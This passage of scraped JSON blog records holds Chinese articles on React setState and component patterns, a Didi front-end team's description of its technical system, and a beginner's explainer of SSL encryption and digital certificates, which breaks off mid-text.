https://github.com/kentcdodds/advanced-react-patterns\n\u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e advanced-react-patterns\nhttp-server ./\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e不过这个项目可以不用server,直接打开即可。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e第一篇\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e如果只是纯UI渲染并且是无状态的组件，可以直接采用纯函数创建组件类。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eApp\u003c/span\u003e\u003c/span\u003e() {\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (\n    \u0026lt;Toggle\n      onToggle={on =\u0026gt; console.log(\u003cspan class=\"hljs-string\"\u003e'toggle'\u003c/span\u003e, on)}\n    /\u0026gt;\n  )\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e初始化数据放在首部声明\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003edefaultProps\u003c/code\u003e 和 \u003ccode\u003epropTypes\u003c/code\u003e 推荐写在组件顶层结构。不过有些做法是把定义的 propTypes 存放到指定的定义文件里（只用来定义数据结构）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eclass Toggle extends React.Component {\n  static defaultProps = {onToggle: () =\u0026gt; {}}\n  state = {on: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e}\n  // 在 \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eState 第二个参数传入一个函数，这个函数可以确保在 state 完成之后触发\n  toggle = () =\u0026gt;\n    this.setState(\n      ({on}) =\u0026gt; ({on: !on}),\n      () =\u0026gt; {\n        this.props.onToggle(this.state.on)\n      },\n    )\n  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e() {\n    const {on} = this.state\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (\n      \u0026lt;Switch on={on} onClick={this.toggle} /\u0026gt;\n    )\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e关于组件中方法的定义位置，如果数据比较少的情况下，可以完全不用定义 constructor。但是当数据略有些复杂的时候，也可以把一些初始化的数据放在 constructor 里定义。 例如：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003econstructor(props) {\n  super(props)\n  this.state = {on: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e}\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e正确 setState\u003c/h3\u003e\n\u003cp\u003e在 React 的 State 变更策略中，setState()并不会立即更新组件，而是可能会延迟，进行批处理一次性更新。\u003c/p\u003e\n\u003cp\u003ethis.setState 除了可以传入对象来更改 state 以外，还可以传入函数。具体的使用请参照官方文档，简单介绍如下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ethis.setState(updater, [callback])\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003eupdater\u003c/code\u003e 函数签名如下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e(prevState, props) =\u0026gt; stateChange\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eupdater函数的的好处是当我们想要基于当前 state 修改下一个 state 时，可以通过第一个回调函数的参数确保你拿到的是原先的state。\u003c/p\u003e\n\u003cp\u003e第二个 callback 表示当 setState() 执行完成之后并且组件被重新渲染之后调用。\n不过在官方文档中，这类逻辑推荐在 \u003ccode\u003ecomponentDidUpdate\u003c/code\u003e 中使用。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e结语\u003c/h3\u003e\n\u003cp\u003e只要数据(props/state)变更 React 就会触发 re-render。因此 React 会尽量让数据批处理只要更新一次以提高性能。在使用 state 时你也无需担心会多次 re-render。React 帮我们做了进一步优化。如果想基于当前 state 修改下一个状态时，尽量使用 setState 中第一个回调函数可以确保你获得的是当前的 state。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e参考资料\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003ehttps://reactjs.org/docs/react-component.html#setstate\u003c/li\u003e\n\u003cli\u003ehttps://doc.react-china.org/docs/react-component.html#setstate\u003c/li\u003e\n\u003cli\u003ehttps://github.com/kentcdodds/advanced-react-patterns\u003c/li\u003e\n\u003c/ol\u003e\n","buildTime":"1514893941.5734","__v":0}
{"_id":{"$oid":"5a4b76a1b11e1a170cb138e4"},"id":"5a3dd19b6fb9a0452846b159","author":{"$oid":"5a4b76a1b11e1a170cb138d2"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"滴滴后市场前端技术体系","meta":{"likeCount":0},"tag":["前端","前端框架"],"comment":[],"shortContent":"经过两年的发展，作为汽车后市场各业务重要支撑的前端团队，随着业务的不断发展，从无到有，从基础到完善，沉淀了支撑业务的前端技术体系。 我们说的前端技术体系，指的是，我们在前端边界内，着眼于产出产品和服务的效率和质量，通过拆分和整合产出过程中的关键工作，最终所形成的一套包含代码，工…","content":"\u003cp\u003e经过两年的发展，作为汽车后市场各业务重要支撑的前端团队，随着业务的不断发展，从无到有，从基础到完善，沉淀了支撑业务的\u003cstrong\u003e前端技术体系\u003c/strong\u003e。\u003c/p\u003e\n\u003cp\u003e我们说的\u003cstrong\u003e前端技术体系\u003c/strong\u003e，指的是，我们在\u003cstrong\u003e前端边界\u003c/strong\u003e内，着眼于产出\u003cstrong\u003e产品和服务\u003c/strong\u003e的\u003cstrong\u003e效率和质量\u003c/strong\u003e，通过\u003cstrong\u003e拆分和整合\u003c/strong\u003e产出过程中的\u003cstrong\u003e关键工作\u003c/strong\u003e，最终所形成的一套包含\u003cstrong\u003e代码，工具，理论，规范，文档\u003c/strong\u003e等的支撑体系。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"前端技术体系概括\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609da41063b8d3b?w=2246\u0026amp;h=1588\u0026amp;f=png\u0026amp;s=74303\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e对于\u003cstrong\u003e前端边界\u003c/strong\u003e，我们认为\u003cstrong\u003e划分\u003c/strong\u003e的界限，不在于具体的细分技术，而在于\u003cstrong\u003e职责\u003c/strong\u003e，简单来说，如果一项开发工作是为了向用户提供可交互的界面，那这就是前端的工作范畴。\u003c/p\u003e\n\u003cp\u003e与\u003cstrong\u003e设计团队\u003c/strong\u003e之间，根据不同的业务场景，制定相应的交互，视觉规范，根据实际产品需求，产出产品交互，视觉稿/原型，这属于\u003cstrong\u003e设计团队\u003c/strong\u003e的工作。而对\u003cstrong\u003e设计团队\u003c/strong\u003e所产出的不同业务场景下的交互，视觉标准，抽象底层组件接口，进而使用抽象组件，实现不同业务的组件库，最终形成前端的组件体系，进而使用组件体系开发产品，甚至提供搭建工具，让产品，运营人员独立操作生成可交互界面，这些属于\u003cstrong\u003e前端团队\u003c/strong\u003e的工作。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"与设计团队边界\" src=\"https://user-gold-cdn.xitu.io/2017/12/29/160a03bec8cbf420?w=2246\u0026amp;h=1588\u0026amp;f=png\u0026amp;s=93780\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e与\u003cstrong\u003e后端团队\u003c/strong\u003e之间，根据产品需求，实现业务逻辑，提供业务维度的原子化接口，这属于\u003cstrong\u003e后端团队\u003c/strong\u003e的工作。而提供页面访问服务，控制页面路由，提供可交互界面，消费业务接口，组装页面，甚至提供交互维度的接口，这些属于\u003cstrong\u003e前端团队\u003c/strong\u003e的工作。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"与后端团队边界\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c93ce1acd486?w=2246\u0026amp;h=1588\u0026amp;f=png\u0026amp;s=87754\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e与\u003cstrong\u003e客户端团队\u003c/strong\u003e之间，提供代码运行容器，扩展需求\u003cstrong\u003e可枚举\u003c/strong\u003e的系统接口，这属于\u003cstrong\u003e客户端团队\u003c/strong\u003e的工作。而选择，创建开发工具，于各种客户端容器之上，抽象统一\u003cstrong\u003e编程接口\u003c/strong\u003e，基于统一编程接口，产出需求\u003cstrong\u003e不可枚举\u003c/strong\u003e的交互界面，这些属于\u003cstrong\u003e前端团队\u003c/strong\u003e的工作。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"与客户端团队边界图片\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609ca5735c60b98?w=2246\u0026amp;h=1588\u0026amp;f=png\u0026amp;s=89246\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e以上\u003cstrong\u003e前端边界\u003c/strong\u003e的划分，除了让相关团队职责清晰，降低沟通成本外，带来的额外好处是，\u003cstrong\u003e配合模式\u003c/strong\u003e的变化和固化，使得\u003cstrong\u003e前端团队\u003c/strong\u003e在与设计，后端，客户端等团队的配合中，始终属于\u003cstrong\u003e消费者\u003c/strong\u003e角色，有利于各团队之间的\u003cstrong\u003e工作并行\u003c/strong\u003e，并且前端从产品到服务，形成了一个\u003cstrong\u003e独立闭环\u003c/strong\u003e，灵活性更好，有利于\u003cstrong\u003e体验优化\u003c/strong\u003e工作的开展。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"前端边界与配合模式\" src=\"https://user-gold-cdn.xitu.io/2017/12/29/160a02741bcf609d?w=2931\u0026amp;h=2390\u0026amp;f=png\u0026amp;s=338865\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e在以上\u003cstrong\u003e前端边界\u003c/strong\u003e内，\u003cstrong\u003e前端团队\u003c/strong\u003e关注的是产品的整个生命周期，而在整个生命周期内，我们的\u003cstrong\u003e关键工作\u003c/strong\u003e分为\u003cstrong\u003e应用\u003c/strong\u003e、\u003cstrong\u003e代码\u003c/strong\u003e、\u003cstrong\u003e工程\u003c/strong\u003e三个重要部分。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"前端关键工作划分\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cd8ee36637ab?w=4490\u0026amp;h=4762\u0026amp;f=png\u0026amp;s=114228\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e应用\u003c/strong\u003e方面，总的来说，我们希望提供给用户\u003cstrong\u003e高可用\u003c/strong\u003e的服务，从而保证我们产品的\u003cstrong\u003e用户体验\u003c/strong\u003e。我们关注\u003cstrong\u003e前后端分离\u003c/strong\u003e，\u003cstrong\u003e客户端容器\u003c/strong\u003e，\u003cstrong\u003e差异性收敛\u003c/strong\u003e，\u003cstrong\u003e监控和容灾\u003c/strong\u003e这几个方面。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"应用体系\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609d0e9d3035874?w=4490\u0026amp;h=6350\u0026amp;f=png\u0026amp;s=408617\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e前后端分离\u003c/strong\u003e方面，我们通过引入一个\u003cstrong\u003e中间层\u003c/strong\u003e，来提供页面访问服务。这个中间层，由前端维护，我们对\u003cstrong\u003e页面请求\u003c/strong\u003e，\u003cstrong\u003e页面路由\u003c/strong\u003e，\u003cstrong\u003e页面渲染\u003c/strong\u003e等有完整的控制能力，甚至我们可以基于它实现\u003cstrong\u003e接口聚合\u003c/strong\u003e，\u003cstrong\u003e数据模拟\u003c/strong\u003e等功能，这些使我们更容易实现\u003cstrong\u003e页面性能优化\u003c/strong\u003e，提升\u003cstrong\u003e用户体验\u003c/strong\u003e。在整个实施过程中，我们采用，\u003cstrong\u003e先分离，后优化\u003c/strong\u003e的策略，保证了整体的稳定性。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e客户端容器\u003c/strong\u003e方面，除了常规的\u003cstrong\u003eWebview\u003c/strong\u003e类容器，我们在实际项目中尝试了\u003cstrong\u003eReact-Native, Weex\u003c/strong\u003e等自定义容器，以解决\u003cstrong\u003eWebview性能问题\u003c/strong\u003e。在与微信小程序场景\u003cstrong\u003e契合度\u003c/strong\u003e比较高的一些产品，我们也尝试开发了\u003cstrong\u003e微信小程序\u003c/strong\u003e应用。我们致力于，在可控的客户端环境内，选用性能更好的客户端容器，从而优化产品体验。同时我们也致力于统一不同容器的使用体验，收敛差异性，降低维护成本。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e差异性收敛\u003c/strong\u003e方面，不同客户端容器有着不同的工作模式，为了降低维护成本，我们需要从业务中，总结实践经验，抽象\u003cstrong\u003e通用模式\u003c/strong\u003e，并开发相关的辅助工具，最终将差异性进行收敛。在\u003cstrong\u003eReact-Native\u003c/strong\u003e的开发过程中，我们提供一套使用体验与\u003cstrong\u003eWebview\u003c/strong\u003e完全一致的客户端容器，从而前端对于\u003cstrong\u003eReact-Native\u003c/strong\u003e项目的发布，更新机制可以完全复用\u003cstrong\u003eWeb\u003c/strong\u003e类项目。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e监控和容灾\u003c/strong\u003e方面，我们利用公司的日志系统和监控系统，对线上问题进行预警，通过静态资源进行前端服务器和CDN双备，服务多实例等部署策略以及代码级的灰度策略等，加上公司的配置平台做开关，最终形成监控和容灾的基本模式。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e代码\u003c/strong\u003e方面，我们的产出分为\u003cstrong\u003e前端代码\u003c/strong\u003e，\u003cstrong\u003e服务端渲染代码\u003c/strong\u003e，前端代码最终生成可交互界面，后端代码最终作为服务，响应页面请求，处理页面渲染。对于两种代码，我们都有规范化的代码体系，并且通常情况下，在所有业务中我们都套用这个体系。从而收敛问题，提高产出效率。\u003c/p\u003e\n\u003cp\u003e对于\u003cstrong\u003e前端代码\u003c/strong\u003e，我们主要采用\u003cstrong\u003e数据驱动\u003c/strong\u003e的编程模式，\u003cstrong\u003e组件化\u003c/strong\u003e的开发方式，配合\u003cstrong\u003e数据管理\u003c/strong\u003e，\u003cstrong\u003e路由管理\u003c/strong\u003e的基本思路进行业务开发。细节性的来说，我们最终的前端代码体系由\u003cstrong\u003e基础库和第三方库，组件库，展示组件，容器组件和数据仓库，路由管理\u003c/strong\u003e这几部分构成。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"前端代码体系\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609d282b8f99f41?w=4490\u0026amp;h=6350\u0026amp;f=png\u0026amp;s=361556\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e对于\u003cstrong\u003e服务端渲染代码\u003c/strong\u003e，我们主要使用\u003cstrong\u003e多进程\u003c/strong\u003e的请求响应并发模式，采用\u003cstrong\u003e中间件\u003c/strong\u003e的请求处理模式，通过将请求路由到具体的\u003cstrong\u003e控制器\u003c/strong\u003e，通过控制器中配置的中间件，进行数据的拉取和页面的拼装，最终完成请求响应。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"服务端渲染代码体系\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609d3318e691699?w=4490\u0026amp;h=6350\u0026amp;f=png\u0026amp;s=207493\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e代码层面上的细节，每一个展开来说，都会有很长篇幅，比如说\u003cstrong\u003e组件库\u003c/strong\u003e的代码设计。对于细节这里我们不做展开，以后找机会再做具体分享。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003e工程\u003c/strong\u003e方面，在项目的\u003cstrong\u003e评审，开发，联调，测试，上线，运营\u003c/strong\u003e各个环节，我们提供相应的\u003cstrong\u003e工具支持，以及标准操作流程和文档\u003c/strong\u003e，从而保证各个环节的产出质量和效率，以及各个环节之间过渡的平滑性。\u003c/p\u003e\n\u003cp\u003e简单来说，在项目\u003cstrong\u003e评审阶段\u003c/strong\u003e，我们提供了\u003cstrong\u003e使用体验一致\u003c/strong\u003e的针对不同场景的\u003cstrong\u003e项目模板\u003c/strong\u003e；在项目\u003cstrong\u003e开发阶段\u003c/strong\u003e，我们提供了\u003cstrong\u003e开发，调试，单元测试，风格校验\u003c/strong\u003e等工具；在项目\u003cstrong\u003e联调测试\u003c/strong\u003e阶段，我们提供了\u003cstrong\u003e打包，部署工具，以及前端代码运行环境的docker容器\u003c/strong\u003e；在项目\u003cstrong\u003e上线阶段\u003c/strong\u003e，我们提供了\u003cstrong\u003e代码打包，部署工具\u003c/strong\u003e。同时，我们提供了一套\u003cstrong\u003ecli\u003c/strong\u003e交互工具，来保证操作的\u003cstrong\u003e易用性\u003c/strong\u003e和\u003cstrong\u003e规范性\u003c/strong\u003e。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"工程体系\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609d99373efe0ee?w=4490\u0026amp;h=6350\u0026amp;f=png\u0026amp;s=418098\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e以上是对滴滴后市场前端技术体系的整体概括，其中的很多细节都可以单独展开来说，比如\u003cstrong\u003e如何创建组件体系\u003c/strong\u003e，\u003cstrong\u003e如何优化React-Native使用体验\u003c/strong\u003e，\u003cstrong\u003eReact，Vue体系下，做数据直出，还是页面直出\u003c/strong\u003e等，我们会尽量找机会再跟大家分享。\u003c/p\u003e\n\u003cp\u003e最后，我们前端团队很缺人，期待各路大神的加入，我们共同提高。有意向者请发简历到wangfeng_cugb@163.com，期待合作共事。\u003c/p\u003e\n","buildTime":"1514894399.6861","__v":0}
{"_id":{"$oid":"5a4b76a1b11e1a170cb138e6"},"id":"5a48e397f265da43284133a6","author":{"$oid":"5a4b76a1b11e1a170cb138d9"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"SSL协议之数据加密过程详解","meta":{"likeCount":0},"tag":["前端","HTTP","HTTPS"],"comment":[],"shortContent":"总括： 本文详细讲述了SSL协议中的数据加密的过程，数字证书、对称加密、非对称加密和SSL握手过程等概念。 只要你听过HTTPS，不可能没听过SSL协议吧，SSL协议是一种安全协议。对于互联网协议没有了解的童鞋可以参考博主另一篇博客：internet协议入门 请听我娓娓道来。先…","content":"\u003ch2 class=\"heading\"\u003e前言\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003e总括：\u003c/strong\u003e 本文详细讲述了SSL协议中的数据加密的过程，数字证书、对称加密、非对称加密和SSL握手过程等概念。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e原文博客地址：\u003ca target=\"_blank\" href=\"http://blog.damonare.cn/2017/12/29/SSL%E5%8D%8F%E8%AE%AE%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B%E8%AF%A6%E8%A7%A3/#more\"\u003eSSL协议之数据加密过程详解\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e知乎专栏\u0026amp;\u0026amp;简书专题：\u003ca target=\"_blank\" href=\"https://zhuanlan.zhihu.com/damonare\"\u003e前端进击者（知乎）\u003c/a\u003e\u0026amp;\u0026amp;\u003ca target=\"_blank\" href=\"http://www.jianshu.com/collection/bbaa63e264f5\"\u003e前端进击者（简书）\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e博主博客地址：\u003ca target=\"_blank\" href=\"http://damonare.cn\"\u003eDamonare的个人博客\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e生活\u003c/strong\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eSSL\u003c/h3\u003e\n\u003cp\u003e只要你听过HTTPS，不可能没听过SSL协议吧，SSL协议是一种安全协议。对于互联网协议没有了解的童鞋可以参考博主另一篇博客：\u003ca target=\"_blank\" href=\"http://blog.damonare.cn/2016/11/26/%E4%BA%92%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8/\"\u003einternet协议入门\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eHTTP+SSL = HTTPS\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eHTTPS之所以安全就是因为加持了SSL这个外挂来对传输的数据进行加密，那么具体的加密方法又是什么呢？\u003c/p\u003e\n\u003cp\u003e请听我娓娓道来。先看下面两个概念：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e对称加密\u003c/strong\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e非对称加密\u003c/strong\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e你知道上面两个概念是什么意思么？😳\u003c/p\u003e\n\u003cp\u003e🤣OK，不管你懂不懂，我先用我的方式来给你解释下：\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e亲，你作过弊么？\u003c/strong\u003e 😑不要告诉我在你漫长的学生生涯里你没作过弊(那你的学生生涯得多枯燥)，作弊我们常用的方法是啥？(说把答案写在胳膊大腿纸条上的同学请你出去，谢谢🙂)当然是加密了！比如我出于人道主义，想要帮助小明同学作弊，首先考试前我们会约定好一个暗号来传递选择题的答案，摸头发——A，摸耳朵——B，咳嗽——C，跺脚——D，于是一个加密方法就诞生了，这个加密方法只有我和小明知道，老师虽然看我抓耳挠腮但他顶多把我当成神经病，并没有直接证据说我作弊。好，\u003cstrong\u003e这种我和小明知道，别人不知道的加密方法就是一种对称加密算法\u003c/strong\u003e,对称加密算法也是我们日常最常见的加密算法。这种算法🔑只有一把，加密解密都用同一把钥匙，一旦🔑泄露就全玩完了。\u003c/p\u003e\n\u003cp\u003e随时时代的进步，人们发现实际上加密和解密不用同一把🔑也是可以的，只要加密和解密的两把🔑存在某种关系就行了。\u003c/p\u003e\n\u003cp\u003e于是，层出不穷的非对称加密算法就被研究了出来，那么它基于什么样的道理呢？请严格记住下面这句话：\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e将a和b相乘得出乘积c很容易，但要是想要通过乘积c推导出a和b极难。即对一个大数进行因式分解极难\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e听不懂因式分解的童鞋先去面壁5分钟，这么多年数学白学了？甩给你维基百科链接，自行补课🙂：\u003ca target=\"_blank\" href=\"https://zh.wikipedia.org/zh-cn/%E5%9B%A0%E5%BC%8F%E5%88%86%E8%A7%A3\"\u003e因式分解\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e好的，我们继续，非对称加密算法就多了两个概念——公钥c和私钥b。\u003c/p\u003e\n\u003cp\u003e用法如下：\u003cstrong\u003e公钥加密的密文只能用私钥解密，私钥加密的密文只能用公钥解密。\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e公钥我们可以随便公开，因为别人知道了公钥毫无用处，经过公钥加密后的密文只能通过私钥来解密。而想要通过公钥推导出a和b极难。但很明显的是，使用非对称加密效率不如对称加密，因为非对称加密需要有计算两个密钥的过程。\u003c/p\u003e\n\u003cp\u003e我们通过密码学中的两个典型的\u003ca target=\"_blank\" href=\"https://zh.wikipedia.org/wiki/%E6%84%9B%E9%BA%97%E7%B5%B2%E8%88%87%E9%AE%91%E4%BC%AF\"\u003e爱丽丝和鲍勃\u003c/a\u003e人物来解释这个非对称加密算法的过程：\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e客户端叫做爱丽丝，服务器叫做鲍勃。\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e爱丽丝： 鲍勃我要给你发送一段消息，把你的公钥给我吧；\u003c/p\u003e\n\u003cp\u003e鲍勃： OK，这是我的公钥：234nkjdfdhjbg324**；\u003c/p\u003e\n\u003cp\u003e爱丽丝：收到公钥，我给你发送的消息经过公钥加密之后是这样的：#\u003cimg alt=\"#\" class=\"equation\" src=\"https://juejin.im/equation?tex=%23\"\u003e@#@!$%*(@;\u003c/p\u003e\n\u003cp\u003e鲍勃：好的，收到了，亲，我来用我的私钥解密看下你真正要给我发送的内容；\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e上述过程就是一个\u003cstrong\u003e非对称加密\u003c/strong\u003e的过程，这个过程安全么？好像是很安全，即使\u003cstrong\u003e查理\u003c/strong\u003e(通信中的第三位参加者)截取了密文和公钥没有私钥还是没法得到明文。😂\u003c/p\u003e\n\u003cp\u003e可如果第三者查理发送给爱丽丝他自己的公钥，然后爱丽丝用查理给的公钥加密密文发送了出去，查理再通过自己的私钥解密，这不就泄露信息了么？我们需要想个办法让爱丽丝判断这个公钥到底是不是鲍勃发来的。\u003c/p\u003e\n\u003cp\u003e于是就有了\u003cstrong\u003e数字证书\u003c/strong\u003e的概念：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e数字证书就是互联网通讯中标志通讯各方身份信息的一串数字，提供了一种在Internet上验证通信实体身份的方式，数字证书不是\u003ca target=\"_blank\" href=\"https://baike.baidu.com/item/%E6%95%B0%E5%AD%97%E8%BA%AB%E4%BB%BD%E8%AF%81\"\u003e数字身份证\u003c/a\u003e，而是身份认证机构盖在数字身份证上的一个章或印（或者说加在数字身份证上的一个签名）。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e😑上面官方的解释看起来就头大。其实它就是一段信息。\u003c/p\u003e\n\u003cp\u003e数字证书内容大体如下：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e签发证书的机构\u003c/li\u003e\n\u003cli\u003e鲍勃的加密算法\u003c/li\u003e\n\u003cli\u003e鲍勃所使用的Hash算法\u003c/li\u003e\n\u003cli\u003e鲍勃的公钥\u003c/li\u003e\n\u003cli\u003e证书到期时间\u003c/li\u003e\n\u003cli\u003e等等\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e数字证书是由权威机构——CA机构统一来进行发行，我们绝对信任这个机构，至于CA机构的安全性…反正99.99%之下都是安全的。🕵\u003c/p\u003e\n\u003cp\u003e为了防止中间有人对证书内容进行更改，有了一个\u003cstrong\u003e数字签名\u003c/strong\u003e的概念，所谓的数字签名就是把以上所有的内容做一个Hash操作，得到一个固定长度然后再传给鲍勃。然而如果别人截取了这个证书然后更改内容，同时生成了新的Hash值那怎么办？处于这个考虑，CA机构在颁发这个证书的时候会用自己的私钥将Hash值加密，从而防止了数字证书被篡改。\u003c/p\u003e\n\u003cp\u003e好，我们来梳理下整个过程：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e第一步：\u003cstrong\u003e首先，当爱丽丝开启一个新的浏览器第一次去访问鲍勃的时候，会先让爱丽丝安装一个\u003c/strong\u003e数字证书\u003c/strong\u003e，这个数字证书里包含的主要信息就是CA机构的公钥。\u003c/li\u003e\n\u003cli\u003e**第二步：**鲍勃发送来了CA机构颁发给自己的数字证书，爱丽丝通过第一步中已经得到的公钥解密CA用私钥加密的Hash-a(\u003cstrong\u003e这个过程就是非对称加密\u003c/strong\u003e)，然后再用传递过来的HASH算法生成一个Hash-b，如果Hash-a === Hash-b就说明认证通过，确实是鲍勃发过来的。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e如上，是整个数字证书的使用过程就是这样的。\u003c/p\u003e\n\u003cp\u003e多说一句，非对称加密实际应用的例子除了SSL还有很多，比如\u003cstrong\u003eSSH\u003c/strong\u003e、\u003cstrong\u003e电子签名\u003c/strong\u003e等；\u003c/p\u003e\n\u003cp\u003e如上提到的，非对称加密计算量很大，效率不如对称加密，我们打开网页最注重的是啥？是速度！是速度！是速度！🏃🏃🏃\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e这点SSL就玩的很巧妙了🤣\u003c/strong\u003e，通信双方通过对称加密来加密密文，然后使用非对称加密的方式来传递对称加密所使用的密钥。这样效率和安全就都能保证了。\u003c/p\u003e\n\u003ch3 